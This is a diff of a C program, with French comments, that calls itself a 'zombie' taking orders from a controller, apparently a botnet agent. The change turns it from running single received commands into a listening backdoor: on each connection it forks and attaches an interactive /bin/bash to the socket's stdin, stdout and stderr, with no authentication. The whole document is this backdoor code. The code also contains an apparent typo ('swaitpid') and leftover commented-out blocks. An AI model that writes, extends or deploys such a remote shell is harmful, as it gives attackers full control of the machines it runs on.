@@ -6,6 +6,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netdb.h>
+#include <sys/wait.h>
 
 #define BUF_SIZE 1024
 
@@ -71,17 +72,14 @@ int main() {
     printf("Le zombie tourne sur ce port :  %d...\n", port);
     struct sockaddr_in client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
-    int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_len);
-    if (client_sock < 0) {
-        printf("Impossible d'accepter la connexion\n");
-        return 1;
-    }
+    int client_sock;
+    
     //printf("conexion zombie temp");
-    close(sock);
-    char buf[BUF_SIZE];
-    int n;
+    //close(sock);
+    //char buf[BUF_SIZE];
+    //int n;
     while (1) {
-        memset(buf, 0, BUF_SIZE);
+       /* memset(buf, 0, BUF_SIZE);
         n = recv(client_sock, buf, BUF_SIZE, 0);
         if (n <= 0) {
             break;
@@ -90,19 +88,31 @@ int main() {
 
 
     printf("Commande reçue par le controlleur : %s\n", buf);
+    */
 
+    client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_len);
+    if (client_sock < 0) {
+        printf("Impossible d'accepter la connexion\n");
+        return 1;
+    }
         int pid = fork();
+        
         if (pid == 0) {
             // FILS    
-            dup2(client_sock, STDOUT_FILENO); 
 
-            char *args[] = {"/bin/bash", "-c", buf, NULL};
-            execvp(args[0], args);
-            perror("execvp");
+            dup2(client_sock, STDIN_FILENO); 
+            dup2(client_sock, STDOUT_FILENO); 
+            dup2(client_sock, STDERR_FILENO); 
+
+
+            execl("/bin/bash", "bash",  NULL);
+            perror("execl");
             exit(1);
         } else if (pid > 0) {
             // PARENT
+           
             int status;
+            //wait(&status);
             swaitpid(pid, &status, 0);
             if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                 printf("OK\n");
@@ -113,12 +123,10 @@ int main() {
             perror("fork");
             return 1;
         }
-
+sleep(1); 
     }   
     
-
-        
-
+    
 close(client_sock);
 
 return 0;
